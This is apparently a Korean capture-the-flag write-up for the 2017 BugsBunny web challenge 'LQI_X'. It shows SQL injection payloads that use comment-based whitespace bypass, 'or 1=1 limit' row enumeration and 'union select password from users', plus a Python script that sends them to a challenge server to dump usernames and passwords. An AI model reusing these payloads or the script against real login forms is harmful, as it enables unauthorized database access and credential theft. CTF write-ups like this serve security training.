# 2017 BugsBunny - [WEB] LQI_X

## Key words

- SQLi
- guessing
- limit

## Solution

문제에 접근 하면 `username`, `passowrd`를 입력 받고 이곳에서 간단히 sql injection이 발생합니다.

진행하다가 블라인드로 이해한 내용은 다음과 같습니다.

- `information_schema`, `database()`, `@@version` 등등이 작동 하지 않음
- 띄어 쓰기 필터링
- users 테이블 명을 guessing
- username, password 필드가 존재

별 다른 정보가 없어서 일단 DB를 털어 봅니다.

>?username=`1`&password=`1'/**/or/**/1=1/**/limit/**/1,1;--`

```
test
hello
flag_is
Bugs_Bunny{SQLi_Easy_!!
so_2017!
```

오잉? 뭔가 출력이 이상하지만 플래그 형태 입니다. 인증을 해보면 정답이 아닙니다. :( 현재 출력되고 있는 부분이 username 이기 때문에, password쪽을 출력 해도록 합니다.

>?username=`1`&password=`1'/**/union/**/select/**/password/**/from/**/users/**/limit/**/1,1;--`

```
_Easy_I_Dont_Think
hello
here
test
}
```

이제 정상 적으로 나온것 같습니다. username 출력과 password 출력의 순서가 맞지 않지만 내용이 많지 않기 때문에 수작업으로 맞춰 보면 다음과 같습니다.

```
hello                        hello
test                         test
flag_is                      hello
Bugs_Bunny{SQLi_Easy_!!      _Easy_I_Dont_Think
so_2017!                     }
```

결과적으로 정답은 `Bugs_Bunny{SQLi_Easy_!!_Easy_I_Dont_Thinkso_2017!}` 이 됩니다.

## Solution Code

```python
import requests

url = "http://34.253.165.46/LQI_X/index.php"

for i in range(0, 6):
    params = {
        "username": "1",
        "password": "1'/**/or/**/1=1/**/limit/**/%d,1--"%(i),
        "login": "login"
    }
    r = requests.get(url, params=params)
    username = r.content.split("<p> ")[1].split("</p>")[0]
    print "[" + username + "] ",

    params = {
        "username": "1",
        "password": "1'/**/union/**/select/**/password/**/from/**/users/**/limit/**/%d,1;--"%(i),
        "login": "login"
    }
    r = requests.get(url, params=params)
    password = r.content.split("<p> ")[1].split("</p>")[0]
    print "[" + password + "]"
```